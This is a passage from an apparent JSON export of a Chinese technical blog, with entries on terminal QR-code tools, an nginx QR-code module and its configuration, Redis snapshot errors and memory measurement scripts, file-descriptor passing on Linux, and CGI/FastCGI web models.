linux\u7ec8\u7aef\u4e0b\u751f\u6210\u5e76\u5c55\u793a\u4e8c\u7ef4\u7801\uff0c\u662f\u4e00\u4e2anode.js\u6a21\u5757\uff0c\u5e26\u547d\u4ee4\u884c\u5de5\u5177\u7a0b\u5e8f\uff0c\u65b9\u4fbf\u4f7f\u7528\uff0c\u4ecb\u7ecd\u6587\u7ae0\uff1a<a href=\"http:\/\/blog.michaelbrooks.ca\/qrcode-terminal\/\">QR Code Terminal<\/a>\n<\/dd>\n\n<dt> <a href=\"https:\/\/github.com\/lincolnloop\/python-qrcode\">python-qrcode<\/a> <\/dt><dd>     linux\u7ec8\u7aef\u4e0b\u751f\u6210\u5e76\u5c55\u793a\u4e8c\u7ef4\u7801\uff0c\u662f\u4e00\u4e2apython\u5305\uff0c\u5e26\u547d\u4ee4\u884c\u5de5\u5177\u7a0b\u5e8f\uff0c\u65b9\u4fbf\u4f7f\u7528\u3002\n<\/dd>\n<\/dl>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">nginx\u7684\u76f8\u5173\u6269\u5c55<\/h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<\/div><div id=\"outline-container-sec-4-1\" class=\"outline-3\">\n<h3 id=\"sec-4-1\">\u57fa\u672c\u7684\u4e8c\u7ef4\u7801<\/h3>\n<div class=\"outline-text-3\" id=\"text-4-1\">\n<p>\n<a href=\"https:\/\/github.com\/dcshi\/ngx_http_qrcode_module\">ngx_http_qrcode_module<\/a>\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4-2\" class=\"outline-3\">\n<h3 id=\"sec-4-2\">\u4e8c\u7ef4\u7801\u4e2a\u6027\u5316\u6c34\u5370<\/h3>\n<div class=\"outline-text-3\" id=\"text-4-2\">\n<p>\nnginx_http_image_filter\u52a0\u4e0a <a href=\"http:\/\/forum.nginx.org\/read.php?21,235958\">\u6c34\u5370\u8865\u4e01<\/a> \u5373\u53ef\u3002\n<\/p>\n\n<p>\n\u4e0b\u9762\u7684\u662f\u7ecf\u8fc7\u4fee\u6539\u540e\u7684 <code>nginx image filter<\/code> \u6a21\u5757\u4ee3\u7801\uff0c\u52a0\u5165\u5c45\u4e2d\u7684\u6c34\u5370\u6548\u679c:\n<\/p>\n\n<p>\n<a href=\"..\/static\/ngx_http_image_filter_module.c\">ngx_http_image_filter_module.c<\/a>\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4-3\" class=\"outline-3\">\n<h3 id=\"sec-4-3\">\u7f16\u8bd1<\/h3>\n<div class=\"outline-text-3\" id=\"text-4-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">--with-debug --with-http_image_filter_module --add-module=\/home\/tangxinfa\/Openso<span style=\"text-decoration: underline;\">urce\/nginx-1.2.7\/..\/ngx_http_qrcode_module\/ --add-module=\/home\/tangxinfa\/Opensource\/nginx-1.2.7\/..\/ngx_devel_kit\/ --add-module=\/home\/tangxinfa\/Opensource\/nginx-1.2.7\/..\/set-misc-nginx-module\/ --add-module=\/home\/tangxinfa\/Opensource\/nginx-1.2.7\/..\/echo-nginx-module\/<\/span>\n<\/pre>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4-4\" class=\"outline-3\">\n<h3 id=\"sec-4-4\">\u914d\u7f6e<\/h3>\n<div class=\"outline-text-3\" id=\"text-4-4\">\n<pre class=\"example\">\nlocation ~ \/qr {\n    qrcode_fg_color FF0000;\n    qrcode_bg_color FFFFFF;    \n    qrcode_level 2;\n    qrcode_hint 2;\n    qrcode_size 120;\n    qrcode_margin 2;\n    qrcode_version 5;\n    set_unescape_uri $txt $arg_txt;\n    qrcode_txt $txt;\n    qrcode_casesensitive 1; \n    qrcode_gen;  \n\n    image_filter_watermark \"\/usr\/share\/pixmaps\/gnome-word.png\";\n    image_filter_watermark_transparency 95; #0-100\n    image_filter watermark;\n}\n<\/pre>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-4-5\" class=\"outline-3\">\n<h3 id=\"sec-4-5\">\u8bbf\u95ee<\/h3>\n<div class=\"outline-text-3\" id=\"text-4-5\">\n<pre class=\"example\">\nhttp:\/\/localhost:8080\/qr?txt=hello\n<\/pre>\n<ul class=\"org-ul\">\n<li>\u663e\u793a\u6548\u679c\uff1a\n<\/li>\n<\/ul>\n\n<div class=\"figure\">\n<p><img src=\"..\/static\/hello_qr.png\" alt=\"hello_qr.png\" \/>\n<\/p>\n<\/div>\n<\/div>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-5\" class=\"outline-2\">\n<h2 id=\"sec-5\">\u4e8c\u7ef4\u7801\u57fa\u7840\u670d\u52a1\u7684\u4e00\u70b9\u601d\u7d22<\/h2>\n<div class=\"outline-text-2\" id=\"text-5\">\n<ul class=\"org-ul\">\n<li>\u5fc5\u987b\u5efa\u7acb\u5728cdn\u7684\u57fa\u7840\u4e0a\n<\/li>\n<li>\u7528\u6237\u53ea\u9700\u6309\u7167\u7ea6\u5b9a\u5c06\u5185\u5bb9\u4ee5\u53ca\u5b9a\u5236\u53c2\u6570\u6309\u7167\u76f4\u89c2\u7684\u65b9\u5f0f\u7f16\u7801\u6210\u4e8c\u7ef4\u7801\u56fe\u7247\u94fe\u63a5\u5373\u53ef\n<\/li>\n<\/ul>\n\n<p>\n\u53c2\u8003\uff1a<a href=\"https:\/\/developers.google.com\/chart\/infographics\/docs\/qr_codes\">https:\/\/developers.google.com\/chart\/infographics\/docs\/qr_codes<\/a><\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "\u89e3\u51b3\u4fdd\u5b58\u5feb\u7167\u5931\u8d25\u540eredis\u65e0\u6cd5\u5199\u5165\u7684\u95ee\u9898",
  "timestamp": "2012-12-16 15:14:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n\u7528\u547d\u4ee4\u884c\u5de5\u5177\u8fde\u4e0a\u540e\u6267\u884c\u201cset test 0\u201d\u51fa\u73b0\u4ee5\u4e0b\u9519\u8bef\u63d0\u793a\uff1a\n<\/p>\n<pre class=\"example\">\nMISCONF Redis is configured to save RDB snapshots, but is currently not able to persist on disk. Commands that may modify the data set are disabled. Please check Redis logs for details about the error.\n<\/pre>\n<p>\n\u8fd9\u4e2a\u5e94\u8be5\u662f\u4e4b\u524d\u5f3a\u5236\u505c\u6b62redis\u5feb\u7167\u5bfc\u81f4\u7684\uff0c\u67e5\u770bredis\u5feb\u7167\u72b6\u6001\u8bc1\u5b9e\u4e86\u8fd9\u4e00\u70b9\uff1a\n<\/p>\n<pre class=\"example\">\nredis 127.0.0.1:6379&gt; info\n...\nrdb_last_bgsave_status:err\n...\n<\/pre>\n<p>\n\u901a\u8fc7\u5173\u95ed\u914d\u7f6e\u9879stop-writes-on-bgsave-error\u89e3\u51b3\u8be5\u95ee\u9898\u3002\n<\/p>\n<pre class=\"example\">\nredis 127.0.0.1:6379&gt; config set stop-writes-on-bgsave-error no\n<\/pre>\n"
},
{
  "title": "\u4f7f\u7528hash\u8868\u7ed3\u6784\u51cf\u5c11redis\u5185\u5b58\u5360\u7528",
  "timestamp": "2012-12-16 15:14:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n\u5f53hash\u7ed3\u6784\u4e2d\u7684\u5143\u7d20\u8f83\u5c11\uff08\u5c11\u4e8eredis.conf:hash-max-zipmap-entries\u6307\u5b9a\u7684\u6570\u91cf\u65f6\uff0c\u914d\u7f6e\u6210&lt;=1000\uff0c\u8fc7\u5927\u4f1a\u51cf\u4f4e\u5904\u7406\u901f\u5ea6\uff0c\u53c2\u89c1\uff1a <a href=\"http:\/\/stackoverflow.com\/questions\/11281734\/redis-using-hashes\">\u8fd9\u91cc<\/a> \u548c <a href=\"http:\/\/instagram-engineering.tumblr.com\/post\/12202313862\/storing-hundreds-of-millions-of-simple-key-value-pairs\">\u8fd9\u91cc<\/a> \uff09\u4e14\u6570\u636e\u4e3a\u6574\u578b\u65f6\uff0credis\u4f7f\u7528\u7279\u6b8a\u7684\u65b9\u5f0f\uff08\u6570\u7ec4\u4fdd\u5b58\uff0c\u65f6\u95f4\u6362\u7a7a\u95f4\uff09\u4fdd\u5b58hash\u7ed3\u6784\u4ee5\u51cf\u5c11\u5185\u5b58\u5360\u7528\uff0c\u53c2\u89c1 <a href=\"http:\/\/redis.io\/topics\/memory-optimization\">\u8fd9\u91cc<\/a> \u548c <a href=\"http:\/\/stackoverflow.com\/questions\/9625246\/what-are-the-underlying-data-structures-used-for-redis\">\u8fd9\u91cc<\/a> \u3002\u4f46\u5f53hash\u7ed3\u6784\u8d85\u8fc7\u6307\u5b9a\u6570\u91cf\u65f6\u5c06\u4f7f\u7528\u666e\u901a\u7684<a href=\"http:\/\/redis.io\/commands#string\">\u5b57\u7b26\u4e32<\/a>\u65b9\u5f0f\u4fdd\u5b58\uff0c\u4e5f\u5c31\u65e0\u6cd5\u518d\u8282\u7701\u5185\u5b58\u4e86\u3002<\/p>\n"
},
{
  "title": "\u4f30\u7b97redis\u5185\u5b58\u5360\u7528",
  "timestamp": "2012-12-16 15:14:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n\u53c2\u8003: <a href=\"http:\/\/lethain.com\/notes-on-redis-memory-usage\/\">Notes on Redis Memory Usage<\/a>\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u6d4b\u8bd5\u73af\u5883\n<dl class=\"org-dl\">\n<dt> redis\u7248\u672c <\/dt><dd>redis_version:2.4.4\n<\/dd>\n<dt> \u64cd\u4f5c\u7cfb\u7edf\uff08uname -a\uff09 <\/dt><dd>Linux CentOS 2.6.32-220.13.1.el6.x86_64 #1 SMP Tue Apr 17 23:56:34 BST 2012 x86_64 x86_64 x86_64 GNU\/Linux\n<\/dd>\n<dt> python\u7248\u672c\uff08python &#x2013;version\uff09 <\/dt><dd>Python 2.6.6\n<\/dd>\n<\/dl>\n<\/li>\n<\/ul>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">Strings<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>\u6d4b\u8bd5\u811a\u672c\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/env python<\/span>\n\n<span style=\"color: #99cc99;\">import<\/span> redis\n<span style=\"color: #99cc99;\">import<\/span> uuid\n<span style=\"color: #99cc99;\">import<\/span> time\n\n<span style=\"color: #ffcc66;\">r<\/span> = redis.Redis(host=<span style=\"color: #66cccc;\">'localhost'<\/span>, port=6379, db=0)\n<span style=\"color: #99cc99;\">for<\/span> num_strings <span style=\"color: #99cc99;\">in<\/span> (100000,):\n<span style=\"background-color: #515151;\"> <\/span>   r.flushall()\n<span style=\"background-color: #515151;\"> <\/span>   time.sleep(1.0)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">initial_size<\/span> = r.dbsize()\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">initial_info<\/span> = r.info()\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span> i <span style=\"color: #99cc99;\">in<\/span> <span style=\"color: #cc99cc;\">xrange<\/span>(0, num_strings):\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   r.<span style=\"color: #cc99cc;\">set<\/span>(<span style=\"color: #cc99cc;\">str<\/span>(uuid.uuid4()), time.time())\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">r.setex(str(uuid.uuid4()), time.time(), 100000)<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">final_size<\/span> = r.dbsize()\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">final_info<\/span> = r.info()\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"For %s strings.\"<\/span> % (num_strings,)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"Keys: %s =&gt; %s\"<\/span> % (initial_size, final_size)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"Memory: %s =&gt; %s\"<\/span> % (initial_info[<span style=\"color: #66cccc;\">'used_memory'<\/span>],\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   final_info[<span style=\"color: #66cccc;\">'used_memory'<\/span>])\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"Memory per key: %d\"<\/span>%((<span style=\"color: #cc99cc;\">int<\/span>(final_info[<span style=\"color: #66cccc;\">'used_memory'<\/span>]) - <span style=\"color: #cc99cc;\">int<\/span>(initial_in<span style=\"text-decoration: underline;\">fo[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'used_memory'<\/span><span style=\"text-decoration: underline;\">])) \/ num_strings)<\/span>\n<\/pre>\n<\/div>\n<\/li>\n<li>\u6d4b\u8bd5\u7ed3\u679c\n<dl class=\"org-dl\">\n<dt> set <\/dt><dd>\u6bcf\u4e2akey-value\u5360\u7528138\u5b57\u8282\uff0c\u53ef\u89c1redis\u672c\u8eab\u7684\u7ef4\u62a4\u5f00\u9500\u4e3a89\u5b57\u8282\n<\/dd>\n<dt> setex <\/dt><dd>\u6bcf\u4e2akey-value\u5360\u7528180\u5b57\u8282\uff0c\u53ef\u89c1redis\u672c\u8eab\u7684\u7ef4\u62a4\u5f00\u9500\u4e3a131\u5b57\u8282\uff0c\u542f\u7528\u8fc7\u671f\u65f6\u95f4\u9700\u898142\u5b57\u8282\u5f00\u9500\uff08\u8fd9\u662f\u56e0\u4e3aredis\u4f7f\u7528\u65b0\u7684\u94fe\u8868\u4fdd\u5b58\u8bbe\u7f6e\u4e86\u8fc7\u671f\u65f6\u95f4\u7684\u6761\u76ee\uff09\u3002\n<\/dd>\n<\/dl>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">Sets<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>\u6d4b\u8bd5\u811a\u672c\n<div class=\"org-src-container\">\n\n<pre class=\"src src-python\"><span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">!\/bin\/env python<\/span>\n\n<span style=\"color: #99cc99;\">import<\/span> redis\n<span style=\"color: #99cc99;\">import<\/span> math\n<span style=\"color: #99cc99;\">import<\/span> time\n\n<span style=\"color: #ffcc66;\">r<\/span> = redis.Redis(host=<span style=\"color: #66cccc;\">'localhost'<\/span>, port=6379, db=0)\n<span style=\"color: #ffcc66;\">set_capcity<\/span> = <span style=\"color: #cc99cc;\">int<\/span>(r.config_get(<span style=\"color: #66cccc;\">\"set-max-intset-entries\"<\/span>)[<span style=\"color: #66cccc;\">\"set-max-intset-entries<\/span><span style=\"color: #66cccc; text-decoration: underline;\">\"<\/span><span style=\"text-decoration: underline;\">])<\/span>\n\n<span style=\"color: #99cc99;\">def<\/span> <span style=\"color: #f99157;\">set_name<\/span>(i, num_strings, set_capcity):\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">set_num<\/span> = math.ceil(num_strings\/<span style=\"color: #cc99cc;\">float<\/span>(set_capcity))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">return<\/span> <span style=\"color: #66cccc;\">\"s%d\"<\/span>%(i%set_num)\n\n<span style=\"color: #99cc99;\">for<\/span> num_strings <span style=\"color: #99cc99;\">in<\/span> (100000,):\n<span style=\"background-color: #515151;\"> <\/span>   r.flushall()\n<span style=\"background-color: #515151;\"> <\/span>   time.sleep(1.0)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">initial_size<\/span> = r.dbsize()\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">initial_info<\/span> = r.info()\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">for<\/span> i <span style=\"color: #99cc99;\">in<\/span> <span style=\"color: #cc99cc;\">xrange<\/span>(0, num_strings):\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #999999; font-style: italic;\">#<\/span><span style=\"color: #999999; font-style: italic;\">r.sadd(\"s\", str(i))<\/span>\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   r.sadd(set_name(i, num_strings, set_capcity), <span style=\"color: #cc99cc;\">str<\/span>(i))\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">final_size<\/span> = r.dbsize()\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #ffcc66;\">final_info<\/span> = r.info()\n\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"For %s strings.\"<\/span> % (num_strings,)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"Keys: %s =&gt; %s\"<\/span> % (initial_size, final_size)\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"Memory: %s =&gt; %s\"<\/span> % (initial_info[<span style=\"color: #66cccc;\">'used_memory'<\/span>],\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   <span style=\"background-color: #515151;\"> <\/span>   final_info[<span style=\"color: #66cccc;\">'used_memory'<\/span>])\n<span style=\"background-color: #515151;\"> <\/span>   <span style=\"color: #99cc99;\">print<\/span> <span style=\"color: #66cccc;\">\"Memory per key: %d\"<\/span>%((<span style=\"color: #cc99cc;\">int<\/span>(final_info[<span style=\"color: #66cccc;\">'used_memory'<\/span>]) - <span style=\"color: #cc99cc;\">int<\/span>(initial_in<span style=\"text-decoration: underline;\">fo[<\/span><span style=\"color: #66cccc; text-decoration: underline;\">'used_memory'<\/span><span style=\"text-decoration: underline;\">])) \/ num_strings)<\/span>\n<\/pre>\n<\/div>\n<\/li>\n\n<li>\u6d4b\u8bd5\u7ed3\u679c\n<dl class=\"org-dl\">\n<dt> \u542f\u7528\u538b\u7f29 <\/dt><dd>\u6bcf\u4e2avalue\u5360\u75284\u5b57\u8282\n<\/dd>\n<dt> \u4e0d\u542f\u7528\u538b\u7f29 <\/dt><dd>\u6bcf\u4e2avalue\u5360\u752839\u5b57\u8282\n<\/dd>\n<\/dl>\n<p>\n\u6ce8\u610f: redis\u7684set\u4ec5\u5f53\u503c\u4e3a\u6574\u578b\uff0c\u538b\u7f29\u624d\u4f1a\u751f\u6548\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5185\u5b58\u9884\u7559<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u9664\u975e\u4f60\u80fd\u591f\u4fdd\u8bc1\u4f60\u7684\u673a\u5668\u603b\u662f\u6709\u4e00\u534a\u7684\u7a7a\u95f2\u5185\u5b58\uff0c\u5426\u5219\u522b\u4f7f\u7528\u5feb\u7167\u65b9\u5f0f\u6301\u4e45\u5316\u6570\u636e\u6216\u8005\u901a\u8fc7\u6267\u884cBGREWRITEAOF\u538b\u7f29aof\u6587\u4ef6\u3002\nredis\u5728\u6267\u884cbgsave\u65f6\uff0c\u4f1a\u8fdb\u884c\u4e00\u6b21fork\uff0cfork\u540e\u7684\u8fdb\u7a0b\u8d1f\u8d23\u5c06\u5185\u5b58\u4e2d\u7684\u6570\u636e\u5199\u5165\u78c1\u76d8\uff0c\u7531\u4e8efork\u91c7\u7528Copy-On-Write\uff0c\u4e24\u4e2aredis\u8fdb\u7a0b\u5171\u4eab\u5185\u5b58\u4e2d\u7684\u6570\u636e\u3002redis\u5982\u679c\u6709\u6570\u636e\u66f4\u65b0\uff0c\u5219\u4f1a\u5c06\u5bf9\u5e94\u7684\u5171\u4eab\u5185\u5b58\u9875\u521b\u5efa\u4e00\u4efd\u526f\u672c\u518d\u66f4\u65b0\uff0c\u5f53\u66f4\u65b0\u64cd\u4f5c\u8db3\u591f\u9891\u7e41\u65f6\uff0c\u5171\u4eab\u7684\u5185\u5b58\u7a7a\u95f4\u4f1a\u8fc5\u901f\u5730\u526f\u672c\u5316\uff0c\u5bfc\u81f4\u7269\u7406\u5185\u5b58\u88ab\u8017\u5149\uff0c\u7cfb\u7edf\u88ab\u8feb\u52a8\u7528\u4ea4\u6362\u7a7a\u95f4\uff0c\u4ece\u800c\u5bfc\u81f4redis\u670d\u52a1\u6781\u4e0d\u7a33\u5b9a\uff0c\u6574\u4e2a\u7cfb\u7edf\u5835\u585e\u5728\u78c1\u76d8io\u4e0a\u3002<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "linux\u4e0b\u8de8\u8fdb\u7a0b\u4f20\u9012\u6587\u4ef6\u63cf\u8ff0\u7b26",
  "timestamp": "2013-03-09 15:11:00",
  "tags": [
    "linux"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">\u95ee\u9898<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u5728web\u5f00\u53d1\u4e2d\uff0c\u4ee5\u5178\u578b\u7684php-fpm\u4e3a\u4f8b\uff0c\u5bf9\u4e8e\u5230\u5916\u90e8\u7cfb\u7edf\u7684\u8fde\u63a5\uff08\u5982\uff1amysql\u3001redis\uff09\u7b49\u90fd\u63d0\u4f9b\u4e86\u6301\u4e45\u8fde\u63a5\u63a5\u53e3\uff08pconnect\uff09\uff0c\u4f46\u662f\u53d7\u9650\u4e8e\u591a\u8fdb\u7a0b\u6a21\u578b\uff0c\u4e8b\u5b9e\u4e0a\u662f\u6bcf\u4e2aphp-fpm\u8fdb\u7a0b\u90fd\u6709\u5355\u72ec\u7684\u4e00\u4e2a\u8fde\u63a5\u6c60\u7684\uff08\u53c2\u89c1\uff1a\u300a<a href=\"http:5f53-php-90474e0a-redis.html\">\u5f53php\u9047\u4e0aredis<\/a>\u300b\uff09\uff0c\u5927\u91cf\u7a7a\u95f2\u8fde\u63a5\u7684\u5b58\u5728\u4e0d\u4ec5\u5bf9\u7cfb\u7edf\u8d44\u6e90\u9020\u6210\u4e86\u6d6a\u8d39\uff08\u4e0d\u5355\u6307fd\u7a7a\u95f4\uff0c\u50cfmysql\u7684\u6bcf\u8fde\u63a5\u4e00\u7ebf\u7a0b\u4f1a\u9644\u5e26\u5927\u91cf\u5185\u5b58\u7a7a\u95f4\uff1asort_buffer\u3001read_buffer\u7b49\uff09\uff0c\u800c\u4e14\u6574\u4e2a\u7cfb\u7edf\u5c06\u65e0\u6cd5\u6a2a\u5411\u6269\u5c55\uff08\u5982\uff1amysql\u8fde\u63a5\u6570\u9650\u5236\uff09\u3002\u5982\u679c\u53ef\u4ee5\u5728\u8fdb\u7a0b\u95f4\u5171\u4eab\u6587\u4ef6\u63cf\u8ff0\u7b26\uff0c\u5c06\u53ef\u4ee5\u5927\u5927\u63d0\u5347\u7cfb\u7edf\u6027\u80fd\uff0c\u4fc3\u8fdb\u591a\u8fdb\u7a0b\u6a21\u578b\u7684\u5e94\u7528\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">\u65b9\u6848<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u5728linux\u5e73\u53f0\u4e0b\uff0csendmsg\u3001recvmsg\u53ef\u4ee5\u5c06\u4e00\u4e2a\u8fdb\u7a0b\u7684\u6587\u4ef6\u63cf\u8ff0\u7b26\u4f20\u9012\u7ed9\u53e6\u4e00\u8fdb\u7a0b\u4f7f\u7528\uff0c\u8fd9\u4f7f\u5f97\u5b9e\u73b0\u7cfb\u7edf\u7ea7\u7684\u8fde\u63a5\u6c60\u6210\u4e3a\u53ef\u80fd\u3002\n<\/p>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">\u5b9e\u73b0<\/h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n\u300aThe Linux Programming Interface\u300b61.13.3 Passing File Descriptors\n<\/p>\n<\/div>\n<\/div>\n"
},
{
  "title": "Web\u6a21\u578b\u521d\u63a2",
  "timestamp": "2013-02-28 15:07:00",
  "tags": [
    "web"
  ],
  "body": "\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">CGI<\/h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n\u5168\u79f0\u4e3aCommon Gateway Interface\uff0c\u5373\u516c\u5171\u7f51\u5173\u63a5\u53e3\u3002\n\u5f53Web\u670d\u52a1\u5668\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u8fd0\u884c\u76f8\u5e94\u7684\u5904\u7406\u7a0b\u5e8f\uff0c\u76f8\u5173\u53c2\u6570\u901a\u8fc7\u6807\u51c6\u8f93\u5165\u4f20\u9012\u7ed9\u5904\u7406\u7a0b\u5e8f\uff0c\u5904\u7406\u7a0b\u5e8f\u7684\u6807\u51c6\u8f93\u51fa\u505a\u4e3a\u54cd\u5e94\u5185\u5bb9\uff0c\u5904\u7406\u7a0b\u5e8f\u8fd0\u884c\u7ed3\u675f\u540e\u5c06\u54cd\u5e94\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u6027\u80fd *\n\n<p>\n\u8fdb\u7a0b\u7ea7\uff0c\u6bcf\u8bf7\u6c42\u4e00\u8fdb\u7a0b\u3002\u8fdb\u7a0b\u521b\u5efa\u6709\u5f88\u5927\u7684\u5f00\u9500\uff0c\u5e76\u53d1\u6570\u4e0e\u7cfb\u7edf\u8d44\u6e90\u6d88\u8017\u5448\u7ebf\u6027\u589e\u957f\uff0c\u6709\u9650\u7684\u7cfb\u7edf\u8d44\u6e90\u6210\u4e3a\u74f6\u9888\u3002\n<\/p>\n<\/li>\n<\/ul>\n<\/div>\n<\/div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">FastCGI<\/h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<p>\n\u4e3aCGI\u7684\u6539\u826f\uff0cCGI\u7a0b\u5e8f\u505a\u4e3a\u72ec\u7acb\u7684\u7f51\u7edc\u540e\u53f0\u7a0b\u5e8f\u8fd0\u884c\uff0c\u5f53Web\u670d\u52a1\u5668\u6536\u5230\u4e00\u4e2a\u8bf7\u6c42\u65f6\uff0c\u53d1\u8d77\u4e00\u4e2atcp\u8bf7\u6c42\u5230\u5904\u7406\u7a0b\u5e8f\uff0c\u901a\u8fc7\u8be5tcp\u8fde\u63a5\u4f20\u5165\u76f8\u5173\u53c2\u6570\uff0c\u5904\u7406\u7a0b\u5e8f\u7684\u54cd\u5e94\u4e5f\u901a\u8fc7\u8be5tcp\u8fde\u63a5\u53d1\u56de\u7ed9Web\u670d\u52a1\u5668\uff0c\u5904\u7406\u7a0b\u5e8f\u5173\u95ed\u8be5\u8fde\u63a5\u8868\u793a\u5904\u7406\u5b8c\u6bd5\uff0cWeb\u670d\u52a1\u5668\u6700\u7ec8\u5c06\u54cd\u5e94\u53d1\u9001\u7ed9\u5ba2\u6237\u7aef\u3002\n<\/p>\n\n<ul class=\"org-ul\">\n<li>\u6027\u80fd 